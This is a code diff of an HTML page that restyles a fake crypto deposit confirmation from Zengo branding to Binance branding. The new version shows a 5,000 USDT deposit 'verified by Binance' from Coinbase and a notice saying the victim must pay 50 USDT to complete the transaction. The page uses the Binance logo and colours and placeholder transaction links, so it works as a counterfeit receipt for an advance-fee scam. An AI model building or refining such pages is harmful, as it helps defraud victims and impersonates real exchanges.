@@ -2,131 +2,176 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BTC Deposit Confirmation - Zengo Style</title>
+  <title>USDT Deposit Confirmation - Binance Style</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    :root {
+      --binance-yellow: #f3ba2f;
+      --binance-dark: #181a20;
+      --binance-grey: #23262f;
+      --binance-light-grey: #353945;
+      --binance-white: #fff;
+      --binance-accent: #d1a115;
+      --binance-green: #27ae60;
+      --binance-red: #eb5757;
+      --binance-blue: #2f80ed;
+    }
     body {
-      background: linear-gradient(135deg, #141852 0%, #23265b 100%);
-      color: #f6f7fb;
-      font-family: 'San Francisco', 'Segoe UI', 'Arial', sans-serif;
+      background: var(--binance-dark);
+      color: var(--binance-white);
+      font-family: 'Inter', 'Segoe UI', 'Arial', sans-serif;
       margin: 0;
       padding: 0;
       min-height: 100vh;
     }
     .container {
-      max-width: 480px;
-      margin: 32px auto;
-      background: rgba(30, 34, 74, 0.98);
-      border-radius: 22px;
-      padding: 32px 24px;
-      box-shadow: 0 6px 24px rgba(20, 24, 82, 0.13);
+      max-width: 470px;
+      margin: 36px auto;
+      background: var(--binance-grey);
+      border-radius: 18px;
+      padding: 34px 28px 28px 28px;
+      box-shadow: 0 8px 32px rgba(24,26,32,0.25);
+      border: 1px solid var(--binance-light-grey);
     }
     .header {
       text-align: center;
-      margin-bottom: 28px;
+      margin-bottom: 30px;
     }
     .header img {
-      width: 60px;
-      margin-bottom: 10px;
+      width: 56px;
+      margin-bottom: 12px;
     }
     h1 {
-      margin: 0 0 8px 0;
-      font-size: 1.6rem;
+      margin: 0 0 10px 0;
+      font-size: 1.55rem;
       font-weight: 700;
-      color: #59e3ff;
-      letter-spacing: 0.5px;
+      color: var(--binance-yellow);
+      letter-spacing: 0.7px;
+    }
+    .header-desc {
+      color: var(--binance-yellow);
+      font-size: 1.03em;
+      font-weight: 500;
+    }
+    .notice {
+      background: rgba(243,186,47,0.16);
+      border: 1px solid var(--binance-yellow);
+      color: var(--binance-dark);
+      padding: 16px 13px;
+      border-radius: 8px;
+      margin-bottom: 22px;
+      text-align: center;
+      font-size: 1.06em;
+      font-weight: 600;
     }
     .summary {
-      background: rgba(44, 48, 92, 0.96);
-      border-radius: 14px;
-      padding: 20px;
-      margin-bottom: 22px;
+      background: var(--binance-light-grey);
+      border-radius: 13px;
+      padding: 21px 20px;
+      margin-bottom: 24px;
+      border: 1px solid var(--binance-grey);
     }
     .summary-row {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 10px;
-      font-size: 1.04em;
+      margin-bottom: 11px;
+      font-size: 1.07em;
     }
     .summary-row:last-child {
       margin-bottom: 0;
     }
     .highlight {
-      color: #59e3ff;
+      color: var(--binance-yellow);
       font-weight: bold;
     }
     .actions {
       display: flex;
-      gap: 12px;
-      margin: 20px 0 26px 0;
+      gap: 15px;
+      margin: 20px 0 28px 0;
       justify-content: center;
     }
     .action-btn {
-      flex: 1 1 48%;
-      background: #59e3ff;
-      color: #141852;
+      flex: 1 1 46%;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
       border: none;
-      border-radius: 8px;
+      border-radius: 7px;
       padding: 12px 0;
-      font-size: 1.08em;
+      font-size: 1.09em;
       font-weight: 600;
       cursor: pointer;
       text-decoration: none;
-      transition: background 0.2s;
+      transition: background 0.2s, box-shadow 0.2s;
+      box-shadow: 0 2px 8px rgba(243,186,47,0.08);
     }
     .action-btn.withdraw {
-      background: #fff;
-      color: #23265b;
-      border: 2px solid #59e3ff;
+      background: var(--binance-white);
+      color: var(--binance-dark);
+      border: 2px solid var(--binance-yellow);
+      box-shadow: 0 2px 8px rgba(243,186,47,0.12);
+    }
+    .action-btn:hover {
+      background: var(--binance-accent);
     }
     .token-table {
       width: 100%;
-      margin-top: 10px;
+      margin-top: 12px;
       border-collapse: collapse;
-      background: rgba(44, 48, 92, 0.93);
-      border-radius: 10px;
+      background: var(--binance-light-grey);
+      border-radius: 9px;
       overflow: hidden;
       font-size: 0.99em;
+      border: 1px solid var(--binance-grey);
+      box-shadow: 0 2px 8px rgba(24,26,32,0.12);
     }
     .token-table th, .token-table td {
-      padding: 10px 8px;
+      padding: 11px 9px;
       text-align: left;
     }
     .token-table th {
-      color: #59e3ff;
-      background: rgba(38, 41, 80, 0.95);
+      color: var(--binance-yellow);
+      background: var(--binance-grey);
       font-weight: 600;
+      border-bottom: 2px solid var(--binance-yellow);
     }
     .token-table tr:not(:last-child) td {
-      border-bottom: 1px solid #23265b;
+      border-bottom: 1px solid var(--binance-grey);
     }
     .security-tip {
-      margin: 18px 0 12px 0;
-      background: rgba(255,255,255,0.08);
-      padding: 14px 15px;
+      margin: 19px 0 13px 0;
+      background: rgba(243,186,47,0.12);
+      padding: 15px 16px;
       border-radius: 8px;
-      color: #ffcf00;
-      font-size: 0.98em;
+      color: var(--binance-yellow);
+      font-size: 1.01em;
       font-weight: 500;
       text-align: center;
+      border: 1px solid var(--binance-yellow);
     }
     .footer {
       text-align: center;
-      margin-top: 28px;
-      color: #bbb;
-      font-size: 0.98em;
+      margin-top: 32px;
+      color: #8e99ad;
+      font-size: 0.99em;
     }
     a {
-      color: #61e3ff;
+      color: var(--binance-yellow);
       text-decoration: underline;
       word-break: break-all;
     }
+    .holdings-title {
+      margin-top:16px; 
+      margin-bottom:9px; 
+      font-size:1.13em; 
+      color:var(--binance-yellow); 
+      font-weight:600;
+    }
     @media (max-width: 600px) {
       .container {
-        padding: 16px 4vw;
+        padding: 18px 5vw;
       }
       .summary, .token-table {
-        font-size: 0.98em;
+        font-size: 0.99em;
       }
     }
   </style>
@@ -134,30 +179,36 @@
 <body>
   <div class="container">
     <div class="header">
-      <!-- Replace the src with your Zengo logo if available -->
-      <img src="https://zengo.com/wp-content/uploads/2022/03/logo-zengo.svg" alt="Zengo Logo">
-      <h1>Bitcoin Deposit Received</h1>
-      <div style="color:#b7f5ff; font-size:1.02em;">Your BTC deposit has been confirmed!</div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo">
+      <h1>USDT Deposit Received</h1>
+      <div class="header-desc">Your USDT deposit has been confirmed!</div>
+    </div>
+    <div class="notice">
+      <span>
+        <strong>Notice:</strong><br>
+        This payment is from <span style="color:var(--binance-accent);">Coinbase</span> and <span style="color:var(--binance-green);">verified by Binance</span>.<br>
+        To complete this transaction, a payment of <span style="color:var(--binance-yellow);">50 USDT</span> is required.
+      </span>
     </div>
     <div class="summary">
       <div class="summary-row">
         <span>Amount</span>
-        <span class="highlight">0.015 BTC <span style="color:#fce672;">($600.00)</span></span>
+        <span class="highlight">5000 USDT <span style="color:#fffbe6;">($5,000.00)</span></span>
       </div>
       <div class="summary-row">
         <span>Date</span>
-        <span>2025-05-27 17:42 UTC</span>
+        <span>2025-07-14 17:20 UTC</span>
       </div>
       <div class="summary-row">
         <span>Deposit Address</span>
         <span>
-          <a href="https://www.blockchain.com/explorer/addresses/btc/bc1qxyzabcd" target="_blank">bc1qxyz...abcd</a>
+          <a href="https://www.blockchain.com/explorer/addresses/usdt/xyzaddress" target="_blank">xyzaddress...abcd</a>
         </span>
       </div>
       <div class="summary-row">
         <span>Transaction Hash</span>
         <span>
-          <a href="https://www.blockchain.com/btc/tx/txhashhere" target="_blank">View in Explorer</a>
+          <a href="https://www.blockchain.com/usdt/tx/txhashhere" target="_blank">View in Explorer</a>
         </span>
       </div>
       <div class="summary-row">
@@ -166,11 +217,11 @@
       </div>
       <div class="summary-row">
         <span>Network Fee</span>
-        <span>0.00002 BTC</span>
+        <span>3 USDT</span>
       </div>
       <div class="summary-row">
         <span>Portfolio Balance</span>
-        <span class="highlight">0.50 BTC <span style="color:#fce672;">($20,000.00)</span></span>
+        <span class="highlight">5000 USDT <span style="color:#fffbe6;">($5,000.00)</span></span>
       </div>
     </div>
 
@@ -179,7 +230,7 @@
       <a href="#" class="action-btn withdraw">Withdraw</a>
     </div>
 
-    <div style="margin-top:14px; margin-bottom:8px; font-size:1.11em; color:#b7f5ff; font-weight:600;">
+    <div class="holdings-title">
       Current Holdings
     </div>
     <table class="token-table">
@@ -189,24 +240,24 @@
         <th>Value</th>
       </tr>
       <tr>
+        <td>USDT</td>
+        <td>5000.00</td>
+        <td>$5,000</td>
+      </tr>
+      <tr>
         <td>BTC</td>
-        <td>0.50</td>
-        <td>$20,000</td>
+        <td>0.00</td>
+        <td>$0</td>
       </tr>
       <tr>
         <td>ETH</td>
-        <td>3.00</td>
-        <td>$11,250</td>
-      </tr>
-      <tr>
-        <td>USDC</td>
-        <td>1,000.00</td>
-        <td>$1,000</td>
+        <td>0.00</td>
+        <td>$0</td>
       </tr>
     </table>
 
     <div class="security-tip">
-      <strong>Security Tip:</strong> Never share your private keys or recovery phrases with anyone. Zengo support will never ask for them.
+      <strong>Security Tip:</strong> Never share your private keys or recovery phrases with anyone. Binance support will never ask for them.
     </div>
 
     <div class="footer">
